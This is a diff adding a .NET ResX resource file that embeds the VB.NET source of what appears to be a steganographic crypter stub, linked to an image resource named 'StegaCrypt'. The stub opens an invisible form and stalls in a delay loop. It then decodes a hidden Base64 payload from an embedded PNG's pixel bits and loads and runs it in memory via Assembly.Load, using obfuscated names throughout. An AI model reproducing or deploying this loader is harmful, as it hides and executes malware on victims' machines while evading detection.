@@ -1,0 +1,381 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="src" xml:space="preserve">
+    <value>Imports System
+Imports System.IO
+Imports System.Net
+Imports System.Windows.Forms
+Imports System.Windows.Forms.Form
+Imports System.Reflection
+Imports System.Threading
+Imports Microsoft.VisualBasic
+Imports System.Text
+Imports System.Runtime
+Imports System.Drawing
+
+Namespace MyApp
+
+    Public Class EntryPoint
+        Public Shared Sub Main()
+            Dim FrmMain As New Form1
+            System.Windows.Forms.Application.Run(FrmMain)
+        End Sub
+    End Class
+
+    Public Class Form1
+		Inherits System.Windows.Forms.Form
+		Private WithEvents PictureBox1 As New PictureBox
+		Dim Shared ass As Assembly = System.Reflection.Assembly.GetExecutingAssembly()
+		
+	    Sub New()
+			Me.Opacity = 0.00
+            Application.EnableVisualStyles()
+			Me.Controls.Add(PictureBox1)
+			Me.Height = 1
+			Me.Width = 1
+        End Sub
+		
+			Function Calc()
+				For value As Integer = 0 To 65565
+					
+					If (value = 65565) Then
+						For value2 As Integer = 0 To 65565
+							
+							If (value2 = 65565) Then
+								For value3 As Integer = 0 To 65565
+									
+									If (value3 = 65565) Then
+										For value4 As Integer = 0 To 65565
+											
+											If (value4 = 65565) Then
+												For value5 As Integer = 0 To 65565
+													
+													If (value5 = 65565) Then
+														For value6 As Integer = 0 To 65565
+															
+															If (value6 = 65565) Then
+																For value7 As Integer = 0 To 65565
+																	
+																	If (value7 = 65565) Then
+																		For value8 As Integer = 0 To 65565
+																			
+																			If (value8 = 65565) Then
+																				For value9 As Integer = 0 To 65565
+																					
+																					If (value9 = 65565) Then
+
+																					End If
+																				Next
+																			End If
+																		Next
+																	End If
+																Next
+															End If
+														Next
+													End If
+												Next
+											End If
+										Next
+									End If
+								Next
+							End If
+						Next
+					End If
+				Next
+		End Function	
+		
+		Private Sub Form1_Shown(sender As Object, e As EventArgs) Handles Me.Shown
+			Calc()
+			Me.Visible = False
+            Dim img = New Bitmap(New MemoryStream(ExtractResource))
+            PictureBox1.Image = img
+            Dim strdec as String = Decode(img)
+            Dim data() As Byte
+			data = System.Convert.FromBase64String(strdec)
+			Dim guibytes As Byte() = data
+            guiscraper(guibytes)
+		End Sub
+				
+		Public Shared Function ExtractResource() As Byte()
+
+			Using resFilestream As Stream = ass.GetManifestResourceStream("tempbild.png")
+				If resFilestream Is Nothing Then Return Nothing
+				Dim ba As Byte() = New Byte(resFilestream.Length - 1) {}
+				resFilestream.Read(ba, 0, ba.Length)
+				Return ba
+			End Using
+		End Function
+		
+		Public Shared Function Encode(BMP As Bitmap, Text As String) As Bitmap
+
+        Dim TxtBytes() As Byte
+        Using Txt_MS As New System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(Text))
+            Using Compress_MS As New System.IO.MemoryStream
+                Using CompressedStream As New System.IO.Compression.DeflateStream(Compress_MS, System.IO.Compression.CompressionLevel.Optimal)
+                    Txt_MS.CopyTo(CompressedStream)
+                End Using
+                TxtBytes = Compress_MS.ToArray
+            End Using
+        End Using
+
+        Dim Length() As Byte = System.BitConverter.GetBytes(TxtBytes.Length)
+        Dim Temp(TxtBytes.Length + 3) As Byte
+        System.Array.Copy(TxtBytes, 0, Temp, 4, TxtBytes.Length)
+        TxtBytes = Temp
+        System.Array.Copy(Length, 0, TxtBytes, 0, 4)
+
+        Dim pixels() As Byte
+        Dim handle As System.Runtime.InteropServices.GCHandle
+        Dim compatibleBMP As Bitmap
+
+            Dim PaddingLength As Integer = 4 - ((BMP.Width * 3) Mod 4)
+            If PaddingLength = 4 Then PaddingLength = 0
+            Dim Stride As Integer = BMP.Width * 3 + PaddingLength
+            ReDim pixels(BMP.Height * Stride)
+            handle = System.Runtime.InteropServices.GCHandle.Alloc(pixels, System.Runtime.InteropServices.GCHandleType.Pinned)
+            Dim Scan0 As System.IntPtr = handle.AddrOfPinnedObject()
+            compatibleBMP = New Bitmap(BMP.Width, BMP.Height, Stride, Imaging.PixelFormat.Format24bppRgb, Scan0)
+            Using g As Graphics = Graphics.FromImage(compatibleBMP)
+                g.DrawImage(BMP, 0, 0, BMP.Width, BMP.Height)
+            End Using
+
+            Dim BmpPtr As Integer = 0
+            Dim BAPtr As Integer = 0
+            Dim BA As New System.Collections.BitArray(TxtBytes)
+
+            For y As Integer = 0 To BMP.Height - 1
+                For x As Integer = 0 To BMP.Width - 1
+                    BmpPtr = x * 3 + y * Stride
+                    For z As Integer = 1 To 3
+                        pixels(BmpPtr) = (pixels(BmpPtr) And &amp;HFE) Or If(BA(BAPtr), 1, 0)
+                        BmpPtr += 1
+                        BAPtr += 1
+                        If BAPtr = BA.Length Then
+                            GoTo Done
+                        End If
+                    Next
+                Next
+            Next
+Done:
+
+            If BAPtr &lt; BA.Length Then
+
+            End If
+
+            Return compatibleBMP
+            handle.Free()
+    End Function
+
+    Public Shared Function Decode(BMP As Bitmap) As String
+
+        If BMP.PixelFormat &lt;&gt; Imaging.PixelFormat.Format24bppRgb Then
+
+        End If
+
+        Dim Data As New Imaging.BitmapData
+        BMP.LockBits(New Rectangle(0, 0, BMP.Width, BMP.Height), Imaging.ImageLockMode.ReadOnly, Imaging.PixelFormat.Format24bppRgb, Data)
+        Dim pixels(BMP.Height * Data.Stride) As Byte
+        System.Runtime.InteropServices.Marshal.Copy(Data.Scan0, pixels, 0, pixels.Length)
+        Dim Stride As Integer = Data.Stride
+        BMP.UnlockBits(Data)
+
+            Dim DecodedBytes As New System.Collections.Generic.List(Of Byte)
+            Dim BmpPtr As Integer = 0
+            Dim Bit As Byte = 0
+            Dim [Byte] As Byte = 0
+            Dim BitIndex As Integer = 0
+            Dim Length As Integer = 0
+
+            For y As Integer = 0 To BMP.Height - 1
+                For x As Integer = 0 To BMP.Width - 1
+                    BmpPtr = x * 3 + y * Stride
+                    For z As Integer = 1 To 3
+                        Bit = (pixels(BmpPtr) And 1) &lt;&lt; BitIndex
+                        [Byte] = [Byte] Or Bit
+                        If BitIndex = 7 Then
+                            If Length &lt;&gt; 0 Then
+                                If DecodedBytes.Count = Length Then
+                                    GoTo Done
+                                End If
+                            End If
+                            DecodedBytes.Add([Byte])
+                            If DecodedBytes.Count = 4 And Length = 0 Then
+                                Dim LengthByte() As Byte = DecodedBytes.ToArray
+                                DecodedBytes.Clear()
+                                Length = System.BitConverter.ToInt32(LengthByte, 0)
+                            End If
+                            [Byte] = 0
+                            BitIndex = 0
+                        Else
+                            BitIndex += 1
+                        End If
+                        BmpPtr += 1
+                    Next
+                Next
+            Next
+Done:
+
+            Dim UTF8Bytes() As Byte
+            Using CompressMS As New System.IO.MemoryStream(DecodedBytes.ToArray)
+                Using DecompressMS As New System.IO.MemoryStream
+                    Using DecompressStream As New System.IO.Compression.DeflateStream(CompressMS, System.IO.Compression.CompressionMode.Decompress)
+                        DecompressStream.CopyTo(DecompressMS)
+                    End Using
+                    UTF8Bytes = DecompressMS.ToArray
+                End Using
+            End Using
+
+            Return System.Text.Encoding.UTF8.GetString(UTF8Bytes)
+    End Function
+		
+	Function guiscraper(ByVal bitches As Byte())
+		podjdkere(bitches)
+		Return Nothing
+	End Function
+	Function MessBox(ByVal msg As String)
+		MsgBox(msg, vbCritical, "Error")
+		Return Nothing
+	End Function
+	Public Sub podjdkere(ByVal bytes As Byte())
+		Dim t As New Thread(AddressOf gfwswffaa)
+		t.TrySetApartmentState(ApartmentState.STA)
+		t.Start(bytes)
+	End Sub
+
+	Public Sub gfwswffaa(ByVal d As Byte())
+		Dim pegfjkclss As Assembly = Assembly.Load(d)
+		Dim doadsjvkjkfd As MethodInfo = pegfjkclss.EntryPoint
+		Dim fgsdssssff As Object() = Nothing
+		If doadsjvkjkfd.GetParameters().Length &gt; 0 Then
+			fgsdssssff = New Object() {New String() {"1"}}
+		End If
+		doadsjvkjkfd.Invoke(Nothing, fgsdssssff)
+		Application.Exit()
+	End Sub
+		
+    End Class
+
+End Namespace</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="StegaCrypt new Design3" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\StegaCrypt new Design3.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+</root>
